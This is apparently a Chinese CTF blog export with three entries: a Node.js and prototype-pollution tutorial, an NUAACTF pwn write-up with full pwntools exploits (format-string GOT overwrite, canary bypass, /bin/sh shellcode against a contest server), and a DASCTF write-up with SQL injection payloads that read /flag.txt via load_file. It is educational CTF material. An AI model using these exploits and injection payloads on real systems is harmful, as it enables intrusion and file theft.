    <url>/2021/01/24/NodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<p>前段时间包括当下，打CTF的时候有遇到NodeJS的题目，但没怎么学过，看到题比较懵。所以决定去学习一下，包括要学JavaScript语法之类的，花点时间，一边做题一边学习了JavaScript的基础。</p>
<a id="more"></a>

<h4 id="NodeJs基础"><a href="#NodeJs基础" class="headerlink" title="NodeJs基础"></a><strong>NodeJs基础</strong></h4><h5 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a><strong>简单介绍</strong></h5><p>Node.js 是一个基于 Chrome V8 引擎的 Javascript 运行环境</p>
<p>但是它是由C++开发的，它只是一个JavaScript语言解释器。</p>
<p>REPL环境运行JavaScript的代码</p>
<p><img src="https://i.loli.net/2021/04/24/XBZbSWAClV9iDEc.png" alt="img"></p>
<p>在浏览器的控制台或者node的运行环境都属于REPL运行环境，均可以运行JS代码。</p>
<p>在NodeJS中分为三个模块，分别是：核心模块、自定义模块、第三方模块。</p>
<p>这里提一点，JS代码在编程时，如果需要使用某个模块的功能，那么就需要提前将其导入，与Python类似，只不过在Python中使用import关键字，而JS中使用require关键字。</p>
<h5 id="读取文件操作"><a href="#读取文件操作" class="headerlink" title="读取文件操作"></a><strong>读取文件操作</strong></h5><p>文件系统模块就是核心模块</p>
<p><img src="https://i.loli.net/2021/04/24/rR5DW4ytcUKuMeV.png" alt="img"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);<span class="comment">//导入fs模块</span></span><br><span class="line">fs.readFile(<span class="string">'./test.txt'</span>,<span class="string">'utf8'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);    </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'---分界线----'</span>);    </span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Hello"</span>);</span><br></pre></td></tr></table></figure></div>

<p>读取文件的操作，下面会在CTF例题中用到。显示了读取文件的各种姿势。</p>
<p>在这里了解更多读取文件的函数和使用。</p>
<p><strong>同步和异步</strong></p>
<p>区别：</p>
<blockquote>
<p>同步方法：等待每个操作完成，然后只执行下一个操作</p>
<p>异步方式：从不等待每个操作完成，而是只在第一步执行所有操作</p>
</blockquote>
<p>看到一个比较有趣的描述：</p>
<blockquote>
<p>同步：可以拿吃饭和看电视来举例子，同步就是先吃完饭，吃完饭后再看电视，不能边看边吃，这就是同步</p>
<p>异步：同样拿上边的例子来说，异步就是边吃饭边看电视，看电视和吃饭同时进行，这样举例就应该很清楚了</p>
</blockquote>
<p>还用上面的代码做例子，readFile()是异步操作，所以其运行结果为</p>
<p><img src="https://i.loli.net/2021/04/24/p4SakO7RtYZlxDz.png" alt="img"></p>
<p>可以很明显的看出来下面阻塞代码程序是正常的同步加载，代码由上到下执行。上面这个异步（非阻塞）代码程序会先输出下面的console.log()然后才执行回掉函数里的代码。</p>
<p><strong>全局变量</strong></p>
<ol>
<li><code>__dirname</code>：当前模块的目录名。</li>
<li><code>__filename</code>：当前模块的文件名。这是当前的模块文件的绝对路径（符号链接会被解析）。</li>
<li><code>exports</code>变量是默认赋值给module.exports，它可以被赋予新值，它会暂时不会绑定到module.exports。</li>
<li><code>module</code>：在每个模块中， module 的自由变量是对表示当前模块的对象的引用。为方便起见，还可以通过全局模块的 exports 访问 module.exports。module 实际上不是全局的，而是每个模块本地的</li>
<li><code>require</code>模块就不多说了，用于引入模块、 JSON、或本地文件。可以从 node_modules 引入模块。</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入 JSON 文件：</span></span><br><span class="line"><span class="keyword">const</span> jsonData = <span class="built_in">require</span>(<span class="string">'./path/filename.json'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入 node_modules 模块或 Node.js 内置模块：</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br></pre></td></tr></table></figure></div>

<p>自行设置：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="code"><pre><span class="line">global.param=<span class="number">1234</span>;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/24/iSyUHJ5NLDwa3du.png" alt="img"></p>
<p>经常使用的全局变量是<code>__dirname</code>、<code>__filename</code>。</p>
<h5 id="HTTP服务"><a href="#HTTP服务" class="headerlink" title="HTTP服务"></a><strong>HTTP服务</strong></h5><p>新建一个测试的js文件，用于开启http服务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入http核心模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="comment">//创建一个服务</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer();</span><br><span class="line"><span class="comment">//绑定连接</span></span><br><span class="line">server.on(<span class="string">'request'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">res,rs</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res.method);<span class="comment">//打印请求的方法    </span></span><br><span class="line">    rs.write(<span class="string">'hello,world!'</span>);<span class="comment">//返回数据       </span></span><br><span class="line">    rs.end();<span class="comment">//断开连接</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//启动监听</span></span><br><span class="line">server.listen(<span class="number">8888</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'请访问127.0.0.1:8888'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p>启动运行该文件，访问指定端口，HTTP服务的网页就显示出来了。</p>
<p><img src="https://i.loli.net/2021/04/24/I6wvltxhB3ErXLD.png" alt="img"></p>
<h5 id="child-process-创建子进程"><a href="#child-process-创建子进程" class="headerlink" title="child_process(创建子进程)"></a><strong>child_process(创建子进程)</strong></h5><p><code>child_process</code>提供了几种创建子进程的方式</p>
<blockquote>
<p>异步方式：spawn、exec、execFile、fork</p>
<p>同步方式：spawnSync、execSync、execFileSync</p>
</blockquote>
<p>经过上面的同步和异步思想的理解，创建子进程的同步异步方式应该不难理解。</p>
<p>在异步创建进程时，<code>spawn</code>是基础，其他的fork、exec、execFile都是基于spawn来生成的。</p>
<p>同步创建进程可以使用<code>child_process.spawnSync()</code>、<code>child_process.execSync()</code>和 <code>child_process.execFileSync()</code> ，同步的方法会阻塞 Node.js 事件循环、暂停任何其他代码的执行，直到子进程退出。</p>
<h4 id="JavaScript原型链"><a href="#JavaScript原型链" class="headerlink" title="JavaScript原型链"></a>JavaScript原型链</h4><h5 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a>原型和原型链</h5><p>首先要知道，JavaScript没有父类和子类这个概念，也没有类和实例的区分，而JavaScript中的继承关系则是靠一种很奇怪的“原型链”模式来实现继承。</p>
<p>在次之前，要先搞清楚对象和函数有什么区别和联系。</p>
<blockquote>
<p>对象是由函数创建的，而函数又是另一种对象。</p>
</blockquote>
<h6 id="JavaScript中的对象"><a href="#JavaScript中的对象" class="headerlink" title="JavaScript中的对象"></a><strong>JavaScript中的对象</strong></h6><p>在JavaScript中几乎所有的事物都是对象，如下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"As1def"</span>,    </span><br><span class="line">    <span class="string">"blog"</span>: <span class="string">"https://As1def.github.io"</span></span><br><span class="line">&#125;</span><br><span class="line">a.name;</span><br><span class="line">a.blog;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br></pre></td></tr></table></figure></div>

<p>其中访问对像的属性，可以有两种方式：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例如</span></span><br><span class="line">a.name; </span><br><span class="line">a[<span class="string">"name"</span>];</span><br></pre></td></tr></table></figure></div>

<h6 id="原型的定义和继承"><a href="#原型的定义和继承" class="headerlink" title="原型的定义和继承"></a><strong>原型的定义和继承</strong></h6><p>原型的定义：</p>
<p>任何对象都有一个原型对象，这个原型对象由对象的内置属性proto指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>a函数内容是a类的构造函数，其中<code>this.name</code>、<code>this.age</code>就是a类的属性。</p>
<p>在JavaScript中，声明了一个函数a，然后浏览器就自动在内存中创建一个对象b，a函数默认有一个属性prototype指向了这个对象b，b就是函数a的原型对象，简称原型。同时，对象b默认有属性constructor指向函数a。</p>
<p><img src="https://i.loli.net/2021/04/24/BtNszC9TX1QuAbh.png" alt="img"></p>
<p>创建一个对象a，对象a会默认有一个属性proto指向构造函数A的原型对象b</p>
<p><img src="https://i.loli.net/2021/04/24/D3EBnq4TLsHo2xf.png" alt="img"></p>
<p>这里A.prototype就指向函数的原型B。则a.<strong>proto</strong>是实例化的对象a的一个属性。</p>
<p>在javascript中，一切都是对象，他也只有对象这一种结构。而对象和对象间又存在继承关系。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line">    a:<span class="number">1</span> ,    </span><br><span class="line">    b: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);  </span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">Object</span>.create(test);<span class="comment">//c继承test</span></span><br><span class="line"></span><br><span class="line">c.a=<span class="number">888</span>;<span class="comment">//继承test的变量</span></span><br><span class="line">c.b();<span class="comment">//继承test的函数</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>每个实例对象(object)都有一个私有属性(proto)指向它的构造函数的原型对象(prototype)，每个实例对象还有一个属性(constructor)指向原型的构造函数。该原型对象也有一个自己的原型对象(proto)，层层向上直到一个对象的原型对象为null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。</p>
</blockquote>
<p>经过不断调用，最终的原型对象会调用到null，这将作为该原型链的最后一个环节，与之对应的，作为终点的 null 自然也是没有原型对象的。</p>
<p><img src="https://i.loli.net/2021/04/24/9m1RgdXhEzK6CGB.png" alt="img"></p>
<h6 id="原型链定义及如何污染"><a href="#原型链定义及如何污染" class="headerlink" title="原型链定义及如何污染"></a><strong>原型链定义及如何污染</strong></h6><p>原型链的核心就是依赖对象proto的指向，当访问的属性在该对象不存在时，就会向上从该对象构造函数的prototype的进行查找，直至查找到Object的原型null为止。</p>
<p><img src="https://i.loli.net/2021/04/24/Veur1v6GwiNs3bQ.png" alt="img"></p>
<blockquote>
<p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p>
</blockquote>
<p>图中的原型链是 <code>cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</code></p>
<p><img src="https://i.loli.net/2021/04/24/SL3NypUdR5MlDAo.png" alt="img"></p>
<p>原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。</p>
<p>由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。</p>
<p>因此我们可以通过 a [“proto“] 的方式去访问其原型对象。</p>
<p><img src="https://i.loli.net/2021/04/24/S71Brqpug4oZcGM.png" alt="img"></p>
<p>调用对象属性时, 会查找属性，如果本身没有，则会去proto中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有proto，那么会去proto的显式原型中查找，一直到null。</p>
<p>p神的文章中提到JavaScript原型链继承</p>
<h4 id="CTF题目实战"><a href="#CTF题目实战" class="headerlink" title="CTF题目实战"></a>CTF题目实战</h4><h5 id="NodeJS简单类型的题目以及常见绕过"><a href="#NodeJS简单类型的题目以及常见绕过" class="headerlink" title="NodeJS简单类型的题目以及常见绕过"></a><strong>NodeJS简单类型的题目以及常见绕过</strong></h5><p>搜集了一下，做个总结，方便自己以后查阅。前面的题目没有涉及到原型链污染，不过也是学到了许多知识。</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>NUAACTF</title>
    <url>/2020/06/01/NUAACTF/</url>
    <content><![CDATA[<p>做了一下南航的校赛，题目相对来说是比较友好的，这里总结一下</p>
<a id="more"></a>

<p><a href="https://github.com/As1def/ctf-challenges/tree/master/pwn/NUAACTF" target="_blank" rel="noopener">题目附件及exp</a></p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>签到题，nc连上就可以读取flag。</p>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>格式化字符串，直接写got表为one_gadget.</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./main'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(binary)</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">"49.235.243.206"</span>,<span class="number">10502</span>)</span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> data :io.sendline(data)</span><br><span class="line">ru=<span class="keyword">lambda</span> data,drop=<span class="literal">True</span> :io.recvuntil(data,drop)</span><br><span class="line">rv=<span class="keyword">lambda</span> data :io.recv(data)</span><br><span class="line">rl=<span class="keyword">lambda</span> data :io.recvline(data)</span><br><span class="line">leak=<span class="keyword">lambda</span> data,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(data, addr))</span><br><span class="line">irt=<span class="keyword">lambda</span>  :io.interactive()</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%33$p'</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(rv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x7B947</span></span><br><span class="line">leak(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line">one_addr=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base+one_addr[<span class="number">2</span>]</span><br><span class="line">payload = <span class="string">'%'</span> </span><br><span class="line">payload += str((one_gadget &amp; <span class="number">0xffff</span> ) - <span class="number">5</span>) </span><br><span class="line">payload += <span class="string">'c'</span>+<span class="string">'aaaaa%12$hn'</span>+<span class="string">'%'</span>+str(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + <span class="number">0xb7</span>) </span><br><span class="line">payload += <span class="string">'c'</span>+<span class="string">'aa%13$hhn'</span> </span><br><span class="line">payload += p64(read_got) </span><br><span class="line">payload += p64(read_got + <span class="number">2</span>) </span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br><span class="line"><span class="comment">#flag&#123;7221CB4A535A0F5E4C47F5FEEC64C952&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>一个栈溢出，改v2为0x40绕过canary。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./main'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(binary)</span></span><br><span class="line">io=remote(<span class="string">"49.235.243.206"</span>,<span class="number">10503</span>)</span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x :io.sendline(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x :io.recvuntil(x,drop)</span><br><span class="line">irt=<span class="keyword">lambda</span>  :io.interactive()</span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x4007FB</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x40</span>)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br><span class="line"><span class="comment">#flag&#123;E291A9922B72C69900DC4D0BB1E29BDE&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>house of lore，这题先放着。。</p>
<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>全局变量的格式化字符串，通过写栈地址(read_got)达成跳板，同样改写got表即可。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./main'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(binary)</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">'49.235.243.206'</span>,<span class="number">10505</span>)</span><br><span class="line">sl=<span class="keyword">lambda</span> x :io.sendline(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x :io.recvuntil(x,drop)</span><br><span class="line">irt=<span class="keyword">lambda</span>  :io.interactive()</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(io) </span></span><br><span class="line"><span class="comment">#payload = '%p,'*10 </span></span><br><span class="line">payload = <span class="string">'%11$p,'</span> </span><br><span class="line">sl(payload) </span><br><span class="line">libc_base = int(ru(<span class="string">','</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - <span class="number">0x20830</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span> </span><br><span class="line">log.success(<span class="string">'libc_base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%'</span> </span><br><span class="line">payload += str(read_got)</span><br><span class="line">payload += <span class="string">'c'</span> </span><br><span class="line">payload += <span class="string">'%8$lln;'</span> </span><br><span class="line">sl(payload) </span><br><span class="line">ru(<span class="string">';'</span>) </span><br><span class="line">payload = <span class="string">'%'</span>+str(read_got + <span class="number">2</span>)+<span class="string">'c'</span>+<span class="string">'%19$lln;'</span> </span><br><span class="line">sl(payload) </span><br><span class="line">ru(<span class="string">';'</span>) </span><br><span class="line">payload = <span class="string">'%'</span>+str(one_gadget &amp; <span class="number">0xffff</span>)+<span class="string">'c'</span>+<span class="string">'%10$hn'</span> </span><br><span class="line">payload += <span class="string">'%'</span>+str(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + <span class="number">0xb9</span>)+<span class="string">'c'</span>+<span class="string">'%38$hhn'</span> </span><br><span class="line">sl(payload) </span><br><span class="line">irt()</span><br><span class="line"><span class="comment">#flag&#123;3DD8600C697604883D8FF17048A6AF37&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><p>这题有点难搞，后来看了其他大佬的思路才知道，其实这是一个写一段汇编从而绕过字符的范围判断，一开始让字符位于可见字符范围内,然后在汇编里面进行单字节修改到想要的字符串。<a href="http://39.96.31.211/2020/05/30/Competition/NUAACTF/" target="_blank" rel="noopener">参考FMYY</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./pwn')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'49.235.243.206'</span>, <span class="number">10506</span>)</span><br><span class="line"></span><br><span class="line">shell = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x22], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x2A], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x2E], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x2F], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x45], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x45], dl</span></span><br><span class="line"><span class="string">sub byte ptr [rsi + 0x45], dl</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">shell += <span class="string">"\x48\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x70"</span></span><br><span class="line">shell += asm(<span class="string">"""</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">"""</span>)	</span><br><span class="line"></span><br><span class="line">shell += <span class="string">"\x7F\x75"</span> <span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;A1191C435648EFFC09A90A8A113117A3&#125;</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <tags>
        <tag>NUAA pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>MAR DASCTF明御攻防赛</title>
    <url>/2021/03/29/MAR-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/</url>
    <content><![CDATA[<h3 id="MAR-DASCTF明御攻防赛"><a href="#MAR-DASCTF明御攻防赛" class="headerlink" title="MAR DASCTF明御攻防赛"></a><strong>MAR DASCTF明御攻防赛</strong></h3><p>赛后复现</p>
<a id="more"></a>

<h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h4><h5 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a><strong>BestDB</strong></h5><p>打开页面，是一个输入框，输入一个id返回用户的一些信息</p>
<p><img src="https://i.loli.net/2021/04/07/DkorREzt7bBYyl2.png" alt="img"></p>
<p>经简单测试，单引号空格之类的字符被过滤，使用双引号与”/**/“即可</p>
<p>测试查询语句字段数为3：</p>
<p><img src="https://i.loli.net/2021/04/07/oASb2HkjaKQYTnm.png" alt="img"></p>
<p>简单测试查询数据库：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">-1"<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/07/cq8kCH4f5TWGIez.png" alt="img"></p>
<p>得到users数据库，接着测试数据表：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">-1"<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="string">"users"</span>)),<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/07/ebJRVFzwGDr9dIg.png" alt="img"></p>
<p>得到两个表：f1agdas、users</p>
<p>最终在f1agdas中得到了提示：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">-1"<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span>(f1agdas)<span class="keyword">from</span>(f1agdas)),<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/07/U7EfvoYQBDzt1a6.png" alt="img"></p>
<p>flag可能在flag.txt里面，尝试读取根目录里的flag.txt，使用<code>load_file</code>读文件：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">-1"<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span>(<span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="number">0x2f666c61672e747874</span>),<span class="number">1</span>,<span class="number">40</span>))),<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>注意这里/flag.txt要进行hex编码，因为flag也被过滤了。</p>
<p><img src="https://i.loli.net/2021/04/07/sVLRjZSgcqhMYwx.png" alt="img"></p>
<h5 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a><strong>ez_login</strong></h5><p>题目给出源码：</p>
